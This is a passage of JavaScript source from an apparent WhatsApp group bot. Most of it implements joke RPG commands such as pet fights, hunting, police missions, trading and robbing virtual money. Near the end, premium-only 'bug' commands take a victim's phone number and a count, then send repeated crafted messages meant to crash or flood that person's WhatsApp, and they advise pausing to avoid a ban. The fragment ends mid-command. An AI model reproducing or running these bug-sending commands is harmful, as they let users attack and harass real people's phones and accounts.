    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦊You* (kyubi ${global.db.users[m.sender].kyubi}) MENANG against his 🦊kyubi *${Dare.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) because of your kyubi🦊 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nPresent Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦊You* (kyubi ${global.db.users[m.sender].kyubi}) KALAH against his 🦊kyubi *${Dare.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) because of your pet ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
break
case 'fightphonix':
case 'phoenix': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🦅phoenix ${penumpang}) ⚔️challenging his 🦅phonix *${nogorojo}* (🦅phoenix you) are fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].phonix;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].phonix;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦅You* (phonix ${global.db.users[m.sender].phonix}) WIN against his 🦅phonix *${Dare.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) because of your phonix🦅 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 10000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦅You* (phonix ${global.db.users[m.sender].phonix}) LOSE the fight 🦅phonixnya *${Dare.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
break
case 'fightkucing':
case 'fightcat': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return reply(`*Cannot battle because you are currently using the arena you own .*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🐱cat ${penumpang}) challenged the 🐈cat *${nogorojo}* (🐱your cat) is fighting over his wife.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].kucing;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kucing;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐈You* the cat ${global.db.users[m.sender].kucing}) WIN against 🐈the cat *${Dare.getName(lawan)}* (cat ${global.db.users[lawan].kucing}) karena kucing🐈you ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐈You* the cat ${global.db.users[m.sender].kucing}) LOSE the fight 🐈the cat *${Dare.getName(lawan)}* the cat ${global.db.users[lawan].kucing}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
 break
case 'fightgriffin':
case 'griffin': {
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
if (!m.isGroup) return reply(mess.only.group)
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  m.reply(`*Your Pet* (🦚griffin ${penumpang}) ⚔️challenge the   griffin *${nogorojo}* (  your griffin) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].griffin;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].griffin;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦚You* (griffin ${global.db.users[m.sender].griffin}) WIN against 🦚The griffin *${Dare.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) because of your griffin   ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🦚You* (griffin ${global.db.users[m.sender].griffin}) LOSE the fight 🦚The griffin *${Dare.getName(lawan)}* (griffin ${global.db.users[lawan].griffin}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
break
case 'fightcentaur': 
case 'centaur': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
Dare.level = global.db.users[m.sender]
  Dare.fightnaga = Dare.fightnaga ? Dare.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof Dare.fightnaga[m.sender] != "undefined" && Dare.fightnaga[m.sender] == true) return m.reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  m.reply(`*Your Pet* (🐴centaur ${penumpang}) ⚔️challenge the 🐴centaur *${nogorojo}* (🐴your centaur) fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  Dare.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].centaur;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].centaur;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐴You* (centaur ${global.db.users[m.sender].centaur}) WIN against 🐴the centaur *${Dare.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) karena centaur🐴you ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\n*Pet🐴You* (centaur ${global.db.users[m.sender].centaur}) LOSE the fight 🐴the centaur *${Dare.getName(lawan)}* (centaur ${global.db.users[lawan].centaur}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    m.reply(`*${Dare.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${Dare.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete Dare.fightnaga[m.sender]
}
break

case 'berburu':
case 'hunt': {
  if (!m.isGroup) return reply(mess.only.group)
    function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Berburu'
    Dare.misi = Dare.misi ? Dare.misi : {}
    if (id in Dare.misi) {
        return replydare( `Complete the Mission ${Dare.misi[id][0]} Above all`)
     }
    if (new Date - user.lastmisi > 3600000) {
		let hewan1 = Math.floor(Math.random() * 10)
		let hewan2 = Math.floor(Math.random() * 10)
		let hewan3 = Math.floor(Math.random() * 10)
		let hewan4 = Math.floor(Math.random() * 10)
		let hewan5 = Math.floor(Math.random() * 10)
		let hewan6 = Math.floor(Math.random() * 10)
		let hewan7 = Math.floor(Math.random() * 10)
		let hewan8 = Math.floor(Math.random() * 10)
		let hewan9 = Math.floor(Math.random() * 10)
		let hewan10 = Math.floor(Math.random() * 10)
		let hewan11 = Math.floor(Math.random() * 10)
		let hewan12 = Math.floor(Math.random() * 10)
		
		let hsl = `🕸 *Hunting Results ${user.registered ? user.name : Dare.getName(m.sender)}* 
${hewan1 ? `
🐂 Bull: ${hewan1}` : ''} ${hewan2 ? `
🐅 Tiger: ${hewan2}` : ''} ${hewan3 ? `
🐘 Elephant: ${hewan3}` : ''} ${hewan4 ? `
🐐 Goat: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Crocodile: ${hewan6}` : ''} ${hewan7 ? `
🐃 Buffalo: ${hewan7}` : ''} ${hewan8 ? `
🐮 Cow: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monkey: ${hewan9}` : ''} ${hewan10 ? `
🐗 Wild Boar: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Chicken: ${hewan12}` : ''}
`.trim()

		user.banteng += hewan1
		user.harimau += hewan2
		user.gajah += hewan3
		user.kambing += hewan4
		user.panda += hewan5
		user.buaya += hewan6
		user.kerbau += hewan7
		user.sapi += hewan8
		user.monyet += hewan9
		user.babihutan += hewan10
		user.babi += hewan11
		user.ayam += hewan12
		
		Dare.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete Dare.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			replydare(`${hsl}`)
		}, 20000)

		setTimeout(() => {
			replydare(`Well here it is`)
		}, 18000)

		setTimeout(() => {
			replydare('Dorr🙂')
		}, 15000)

		setTimeout(() => {
			replydare('Get Target')
		}, 14000)

		setTimeout(() => {
			replydare('Is looking for prey...')
		}, 0)
		user.lastmisi = new Date * 1
	} else replydare(`Please wait for ${timers}, to complete the mission again`)
}
break

//=========================================\\
case 'polisi':
case 'police': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = Dare.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Polisi'
    Dare.misi = Dare.misi ? Dare.misi: {}
    if (id in Dare.misi) {
        replydare(`Complete the Mission ${Dare.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 10)
        let randomaku2 = Math.floor(Math.random() * 10)

        let rbrb1 = (randomaku1 * 100000)
        let rbrb2 = (randomaku2 * 1000)

        var dimas = `
👮Chasing Thieves....
`.trim()

        var dimas2 = `
👮Catch the thief....
`.trim()

        var dimas3 = `
🚔Take it to the police station\nAnd in prison
`.trim()

        var dimas4 = `
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Police Results ${name} ]—*
➕ 🙂 Money = [ ${rbrb1} ]
➕ 🙂 Exp = [ ${rbrb2} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()

        user.money += rbrb1
        user.exp += rbrb2
        user.ojekk += 1

        Dare.misi[id] = [
            kerja,
            setTimeout(() => {
delete Dare.misi[id]
            }, 27000)
        ]

        setTimeout(() => {
            replydare(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replydare(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replydare(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
           replydare(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replydare(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replydare('??On Patrol.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replydare(`Please wait for ${timers}, to complete the mission again`)
}
break
//=========================================\\
// let pajak = 0.02
case 'berdagang':
case 'trade': {
  if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

    let dapat = (Math.floor(Math.random() * 5000))
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) return replydare ('Tag the one you want to trade with')
    if (typeof db.users[who] == 'undefined') return replydare('Pengguna tidak ada didalam data base')
    let __timers = (new Date - global.db.users[m.sender].lastdagang)
    let _timers = (28800000 - __timers)
    let timers = clockString(_timers)
    let users = global.db.users
    let username = Dare.getName(who)
    if (new Date - global.db.users[m.sender].lastdagang > 28800000) {
        if (4999 > users[who].money) return replydare ('Target does not have capital, please enter capital 5000')
        if (4999 > users[m.sender].money) return replydare ('If you dont have capital, please enter capital of 5000')
        users[who].money -= dapat * 1
        users[m.sender].money -= dapat * 1
        global.db.users[m.sender].lastdagang = new Date * 1
        replydare(`Please wait sɪʀ..\nYou and @${who.replace(/@.+/, '')} is trading.. ðŸ˜…\n\nYou and @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
        setTimeout(() => {
            replydare(m.chat, `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 3600000)
        setTimeout(() => {
            replydare(`Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 7200000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 10800000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 14400000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 18000000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 21600000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYour trading income will be +50000\n${users[m.sender].money += 50000} Your money\n\nTrading income @${who.replace(/@.+/, '')} get +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 25200000)
        setTimeout(() => {
            replydare( `Congratulations, you and @${who.replace(/@.+/, '')} get money..\n\nYou get your trading income +10000\n${users[m.sender].money += 10000} Your money\n\nTrading income @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
        }, 28800000)
    } else replydare(`You Have Traded , wait ${timers} Again..`)

}
break

//=========================================\\
case 'rob':
  case 'rampok': {
    if (!m.isGroup) return reply(mess.only.group)
function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}

function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let dapat = (Math.floor(Math.random() * 100000))
    let users = global.db.users
    let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    if (!who) return replydare('Tag the person you want to rob!')
    if (typeof global.db.users[who] == 'undefined') return replydare('The user does not exist in the database')
    if (users[who].level > users[m.sender].level) return replydare(`Your level must be higher than @${who.split('@')[0]} To be able to rob him!`, false, { mentions: [who] })
    let __timers = (new Date - global.db.users[m.sender].lastrampok)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers)
    if (new Date - global.db.users[m.sender].lastrampok > 3600000) {
        if (10000 > users[who].money) return replydare('there is no target 💰 stupid money, kill him')
        users[who].money -= dapat * 1
        users[m.sender].money += dapat * 1
        global.db.users[m.sender].lastrampok = new Date * 1
        replydare( `managed to rob the target of money amounting to 💰${dapat}`)
    } else replydare( `You've robbed and managed to hide, wait ${timers} to rob again`)
}
break
//=========================================\\
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replydare('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Detected ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replydare(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replydare(`${teks}`) 
await sleep(2000)
replydare("Deleting Memories files...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replydare("Successfully deleted all Memories in the session folder")     
});
}
break
//======================================================================
case 'amountbug': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Dare.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replydare(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
//======================================================================
//bug cases
case 'xandroid': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'xios': {
  if (!isPrem) return replyprem(mess.premium)
  if (!text) return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replydare(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replydare("The amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Dare.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "23481xxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return replydare("The number is not registered on WhatsApp");
  }
  replydare("Please wait, "+command+" bugs are in progress..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Submitted Bug To @" + whatsappNumber.split('@')[0] + 
    " Use *" + command + "* âœ…\n\nPause for 2 minutes so the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'xios2':
  {
	if (!isPrem) return replyprem(mess.premium)
    if (!text){
      return replydare(`Examples of use: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replydare("The amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replydare("Please wait, "+command+" bugs are in progress..");
    await sleep(1500); // Adjusted sleep time for clarity
